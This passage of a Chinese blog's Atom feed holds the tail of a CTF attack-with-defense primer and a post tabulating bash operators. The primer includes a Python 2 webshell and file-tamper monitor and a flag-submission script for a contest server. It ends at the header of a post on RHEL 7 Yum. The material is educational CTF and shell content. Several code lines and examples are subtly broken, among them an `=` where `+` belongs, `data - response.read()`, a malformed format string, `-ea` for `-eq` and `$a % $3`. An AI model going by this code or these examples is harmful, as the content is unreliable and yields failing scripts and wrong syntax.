class="string">&apos;.txt&apos;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> <span class="string">u&apos;[!] move webshell error, &quot;%s&quot; maybe is webshell.&apos;</span>%getUnicode(filepath)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">f = open(os.path.join(Special_path[<span class="string">&apos;log&apos;</span>],<span class="string">&apos;log.txt&apos;</span>),<span class="string">&apos;a&apos;</span>)</span><br><span class="line">f.write(<span class="string">&apos;newfile: &apos;</span> + getUnicode(filepath) = <span class="string">&apos; : &apos;</span> + str(time.ctime()) + <span class="string">&apos;\n&apos;</span>)</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> <span class="string">u&apos;[-] log error : file move error: &apos;</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x9632;&#x6B62;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x8FD8;&#x539F;&#x88AB;&#x4FEE;&#x6539;&#x6587;&#x4EF6;</span></span><br><span class="line">md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line"><span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line"><span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">f = open(filekey, <span class="string">&apos;r&apos;</span>).read()</span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">u&apos;[*] file had be change : &apos;</span> + getUnicode(filekey)</span><br><span class="line">shutil.move(filekey, os.path.join(Special_path[<span class="string">&apos;difffile&apos;</span>], ntpath.basename(filekey) + <span class="string">&apos;.txt&apos;</span>))</span><br><span class="line">shutil.move(os.path.join(Special_path[<span class="string">&apos;bak&apos;</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> <span class="string">u&apos;[!] move webshell error, &quot;%&quot; maybe is webshell.&apos;</span>%getUnicode(filekey)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">f = open(os.path.join(Special_path[<span class="string">&apos;log&apos;</span>],<span class="string">&apos;log.txt&apos;</span>),<span class="string">&apos;a&apos;</span>)</span><br><span class="line">f.write(<span class="string">&apos;diff_file: &apos;</span> + getUnicode(filekey) + <span class="string">&apos; : &apos;</span> + getUnicode(time.ctime()) + <span class="string">&apos;\n&apos;</span>)</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> <span class="string">u&apos;[-] log error : done_diff: &apos;</span> + getUnicode(filekey)</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#print `[*] &apos; + getUnicode(time.ctime())</span></span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;"><a href="#&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;" class="headerlink" title="&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;"></a>&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;</h1><p>&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x53EA;&#x6709;&#x51E0;&#x5206;&#x949F;&#x4E00;&#x8F6E;&#xFF0C;&#x624B;&#x5DE5;&#x63D0;&#x4EA4;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;flag&#x663E;&#x7136;&#x4E0D;&#x884C;&#xFF0C;&#x9700;&#x8981;&#x51C6;&#x5907;&#x6279;&#x91CF;&#x63D0;&#x4EA4;flag&#x7684;&#x811A;&#x672C;&#xFF1A;<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"></span><br><span class="line">server_host = <span class="string">&apos;10.10.0.2&apos;</span></span><br><span class="line">server_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(team_token, flag, host=server_host, port=server_port, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> team_token <span class="keyword">or</span> <span class="keyword">not</span> flag:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">&apos;team_token or flag not found&apos;</span>)</span><br><span class="line">conn = httplib.HTTPConnection(host, port, timeout=timeout)</span><br><span class="line">params = urllib.urlencode({</span><br><span class="line"><span class="string">&apos;token&apos;</span>: team_token,</span><br><span class="line"><span class="string">&apos;flag&apos;</span>: flag,</span><br><span class="line">})</span><br><span class="line">headers = {</span><br><span class="line"><span class="string">&quot;Content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">}</span><br><span class="line">conn.request(<span class="string">&apos;POST&apos;</span>, <span class="string">&apos;/api/submit_flag&apos;</span>, params, headers)</span><br><span class="line">response = conn.getresponse()</span><br><span class="line">data - response.read()</span><br><span class="line"><span class="keyword">return</span> json.loads(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">&apos;usage: ./submitflag.py $team_token $flag&apos;</span></span><br><span class="line">sys.exit()</span><br><span class="line">host = server_host</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">host = sys.argv[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">print</span> json.dumps(submit(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>], host=host), indent=<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;"><a href="#&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;" class="headerlink" title="&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;"></a>&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;</h1><p>&#x901A;&#x8FC7;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;&#x7684;&#x5206;&#x6790;&#xFF1A;</p><ol><li>&#x611F;&#x77E5;&#x53EF;&#x80FD;&#x6B63;&#x5728;&#x53D1;&#x751F;&#x7684;&#x653B;&#x51FB;&#xFF0C;&#x4ECE;&#x800C;&#x89C4;&#x907F;&#x5B58;&#x5728;&#x7684;&#x5B89;&#x5168;&#x98CE;&#x9669;</li><li>&#x5E94;&#x6025;&#x54CD;&#x5E94;&#xFF0C;&#x8FD8;&#x539F;&#x653B;&#x51FB;&#x8005;&#x7684;&#x653B;&#x51FB;&#x8DEF;&#x5F84;&#xFF0C;&#x4ECE;&#x800C;&#x633D;&#x56DE;&#x5DF2;&#x7ECF;&#x9020;&#x6210;&#x7684;&#x635F;&#x5931;<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIqNzjABB7ic3kJiboFAhfewO13JCH5icv85RLzia8xuzmUNia51oTj4XicRiabl7SW56y46PuuUggLUTeV6Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIqNzjABB7ic3kJiboFAhfewO1d9FOHh2XciciaPbKQqZLcvFUOTTm5mDItUDicbBQcrPpGu9I3RQU8wtWw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="" title="">                </div>                <div class="image-caption"></div>            </figure></li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h1 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h1><p><a href="https://github.com/admintony/Prepare-for-AWD.git" target="_blank" rel="noopener">&#x811A;&#x672C;&#x6E90;&#x7801;&#x94FE;&#x63A5;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。&lt;br&gt;新手该知道的一些知识以及技巧，下面简单整理一下&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="https://marnm.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="https://marnm.github.io/tags/CTF/"/>
    
      <category term="信息安全" scheme="https://marnm.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="网络空间安全" scheme="https://marnm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://marnm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Shell的基本运算符</title>
    <link href="https://marnm.github.io//posts/1fdc29d2/"/>
    <id>https://marnm.github.io//posts/1fdc29d2/</id>
    <published>2018-08-10T14:18:16.000Z</published>
    <updated>2018-08-12T08:28:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>Shell &#x548C;&#x5176;&#x5B83;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x4E00;&#x6837;&#xFF0C;&#x652F;&#x6301;&#x591A;&#x79CD;&#x8FD0;&#x7B97;&#x7B26;&#xFF0C;&#x5305;&#x62EC;&#xFF1A;</p><ul><li>&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;</li><li>&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;</li><li>&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;</li><li>&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;</li><li>&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;<br>&#x539F;&#x751F;bash&#x4E0D;&#x652F;&#x6301;&#x7B80;&#x5355;&#x7684;&#x6570;&#x5B66;&#x8FD0;&#x7B97;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5176;&#x5B83;&#x547D;&#x4EE4;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;&#x4F8B;&#x5982;<code>awk</code>&#x548C;<code>expr</code>&#x6700;&#x5E38;&#x7528;&#x3002;<br><code>expr</code>&#x662F;&#x4E00;&#x6B3E;&#x8868;&#x8FBE;&#x5F0F;&#x8BA1;&#x7B97;&#x5DE5;&#x5177;&#xFF0C;&#x4F7F;&#x7528;&#x5B83;&#x80FD;&#x5B8C;&#x6210;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x6C42;&#x503C;&#x64CD;&#x4F5C;&#x3002;<a id="more"></a><h1 id="&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;</h1>&#x76F8;&#x5F53;&#x4E8E;&#x5C0F;&#x5B66;&#x77E5;&#x8BC6;</li></ul><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>+</td><td>&#x52A0;</td><td>`expr $a + $b`&#x7ED3;&#x679C;&#x4E3A;30</td></tr><tr><td>-</td><td>&#x51CF;</td><td>`expr $b - $a`&#x7ED3;&#x679C;&#x4E3A;10</td></tr><tr><td>*</td><td>&#x4E58;</td><td>`expr $a \* $b`&#x7ED3;&#x679C;&#x4E3A;200</td></tr><tr><td>/</td><td>&#x9664;</td><td>`expr $b \ $a`&#x7ED3;&#x679C;&#x4E3A;2</td></tr><tr><td>%</td><td>&#x53D6;&#x4F59;</td><td>`expr $a % $3`&#x7ED3;&#x679C;&#x4E3A;1</td></tr><tr><td>=</td><td>&#x8D4B;&#x503C;</td><td>`expr $a = $b`&#x7ED3;&#x679C;&#x4E3A;false</td></tr><tr><td>==</td><td>&#x7B49;&#x4E8E;</td><td>`expr $a == $b`&#x7ED3;&#x679C;&#x4E3A;false</td></tr><tr><td>!=</td><td>&#x4E0D;&#x7B49;&#x4E8E;</td><td>`expr $a != $b`&#x7ED3;&#x679C;&#x4E3A;true</td></tr></tbody></table><h1 id="&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;</h1><p>&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;&#x53EA;&#x652F;&#x6301;&#x6570;&#x5B57;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x9664;&#x975E;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x503C;&#x662F;&#x6570;&#x5B57;&#x3002;</p><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>-eq</td><td>&#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x6570;&#x662F;&#x5426;<code>&#x76F8;&#x7B49;</code>&#xFF0C;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true</td><td>[ $a -ea $b]&#x8FD4;&#x56DE;false</td></tr><tr><td>-ne</td><td>&#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x6570;&#x662F;&#x5426;<code>&#x4E0D;&#x76F8;&#x7B49;</code>,&#x4E0D;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true</td><td>[ $a -ne $b ]&#x8FD4;&#x56DE;true</td></tr><tr><td>-gt</td><td>&#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;<code>&#x5927;&#x4E8E;</code>&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -gt $b ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-lt</td><td>&#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;<code>&#x5C0F;&#x4E8E;</code>&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -lt $b ]&#x8FD4;&#x56DE;true</td></tr><tr><td>-ge</td><td>&#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;<code>&#x5927;&#x4E8E;&#x7B49;&#x4E8E;</code>&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -ge $b ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-le</td><td>&#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;<code>&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;</code>&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -le $b ]&#x8FD4;&#x56DE;true</td></tr></tbody></table><h1 id="&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;</h1><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>!</td><td>&#x2018;&#x975E;&#x2019;&#x8FD0;&#x7B97;&#xFF0C;&#x628A;&#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x4E2D;&#x7684;&#x5224;&#x65AD;&#x7ED3;&#x679C;&#x53D6;&#x76F8;&#x53CD;&#x503C;</td><td>[ !false ]&#x8FD4;&#x56DE;true</td></tr><tr><td>-o</td><td>&#x2018;&#x6216;&#x2019;&#x8FD0;&#x7B97;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x8868;&#x8FBE;&#x5F0F;&#x4E3A;true&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -lt 20 -o $b -gt 100]&#x8FD4;&#x56DE;true</td></tr><tr><td>-a</td><td>&#x2018;&#x4E0E;&#x2019;&#x8FD0;&#x7B97;&#xFF0C;&#x4E24;&#x4E2A;&#x8868;&#x8FBE;&#x5F0F;&#x90FD;&#x4E3A;true&#x624D;&#x8FD4;&#x56DE;true</td><td>[ $a -lt -a $b -gt 100 ]&#x8FD4;&#x56DE;false</td></tr></tbody></table><h1 id="&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;</h1><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;&#xFF0C;&#x903B;&#x8F91;`&#x4E0E;`&#x8FD0;&#x7B97;&#xFF0C;&#x524D;&#x9762;&#x7684;&#x6761;&#x4EF6;&#x6267;&#x884C;&#x6210;&#x529F;&#x540E;&#x6267;&#x884C;&#x540E;&#x9762;&#x7684;&#xFF0C;[[ $a -lt 100 &amp;&amp; $b -gt 100]]&#x8FD4;&#x56DE;false</span><br><span class="line">||&#xFF0C;&#x903B;&#x8F91;`&#x6216;`&#x8FD0;&#x7B97;&#xFF0C;&#x524D;&#x9762;&#x7684;&#x6761;&#x4EF6;&#x6267;&#x884C;&#x5931;&#x8D25;&#x540E;&#x6267;&#x884C;&#x540E;&#x9762;&#x7684;&#xFF0C;[[ $a -lt 100 `||` $b -gt 100]]&#x8FD4;&#x56DE;true</span><br></pre></td></tr></tbody></table></figure><h1 id="&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;</h1><!--more--><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>=</td><td>&#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x76F8;&#x7B49;&#xFF0C;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true</td><td>[$a = $b]&#x8FD4;&#x56DE;false</td></tr><tr><td>!=</td><td>&#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x76F8;&#x7B49;&#xFF0C;&#x4E0D;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true</td><td>[$a != $b ]&#x8FD4;&#x56DE;true</td></tr><tr><td>-z</td><td>&#x68C0;&#x6D4B;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x662F;&#x5426;&#x4E3A;0&#xFF0C;&#x4E3A;0&#x8FD4;&#x56DE;true</td><td>[ -z $a ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-n</td><td>&#x68C0;&#x6D4B;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x662F;&#x5426;&#x4E3A;0&#xFF0C;&#x4E0D;&#x4E3A;0&#x8FD4;&#x56DE;true</td><td>[ -n &#x201C;$a&#x201D; ]&#x8FD4;&#x56DE;true</td></tr><tr><td>str</td><td>&#x68C0;&#x6D4B;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;&#x4E0D;&#x4E3A;&#x7A7A;&#x8FD4;&#x56DE;true</td><td>[ $a ]&#x8FD4;&#x56DE;true</td></tr></tbody></table><h1 id="&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;</h1><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>-b</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x5757;&#x8BBE;&#x5907;&#x6587;&#x4EF6;</td><td>[ -b $file ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-c</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x5B57;&#x7B26;&#x8BBE;&#x5907;&#x6587;&#x4EF6;</td><td>[ -c $file ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-d</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x76EE;&#x5F55;&#x7C7B;&#x578B;</td><td>[ -d $file ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-f</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x666E;&#x901A;&#x6587;&#x4EF6;&#xFF08;&#x65E2;&#x4E0D;&#x662F;&#x76EE;&#x5F55;&#xFF0C;&#x4E5F;&#x4E0D;&#x662F;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#xFF09;</td><td>[ -f $file]</td></tr><tr><td>-g</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E86;SGID&#x4F4D;</td><td></td></tr><tr><td>-k</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E86;&#x7C98;&#x7740;&#x4F4D;(Sticky Bit)</td><td></td></tr><tr><td>-p</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x6709;&#x540D;&#x7BA1;&#x9053;</td><td></td></tr><tr><td>-u</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E86;SUID&#x4F4D;</td><td></td></tr><tr><td>-r</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x8BFB;</td><td></td></tr><tr><td>-w</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x5199;</td><td></td></tr><tr><td>-x</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x6267;&#x884C;</td><td></td></tr><tr><td>-s</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x7A7A;</td><td></td></tr><tr><td>-e</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#xFF08;&#x5305;&#x62EC;&#x76EE;&#x5F55;&#xFF09;&#x662F;&#x5426;&#x5B58;&#x5728;</td><td></td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Shell 和其它编程语言一样，支持多种运算符，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;算数运算符&lt;/li&gt;
&lt;li&gt;关系运算符&lt;/li&gt;
&lt;li&gt;布尔运算符&lt;/li&gt;
&lt;li&gt;字符串运算符&lt;/li&gt;
&lt;li&gt;文件测试运算符&lt;br&gt;原生bash不支持简单的数学运算，但是可以通过其它命令来实现，例如&lt;code&gt;awk&lt;/code&gt;和&lt;code&gt;expr&lt;/code&gt;最常用。&lt;br&gt;&lt;code&gt;expr&lt;/code&gt;是一款表达式计算工具，使用它能完成表达式的求值操作。
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="Shell" scheme="https://marnm.github.io/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>RHEL 7配置Yum软件仓库</title>
    <link href="https://marnm.github.io//posts/afdfa673/"/>
    <id>https://marnm.github.io//posts/afdfa673/</id>
    <published>2018-08-07T07:18:07.000Z</published>
    <updated>2022-05-26T13:44:31.195Z</updated>
    
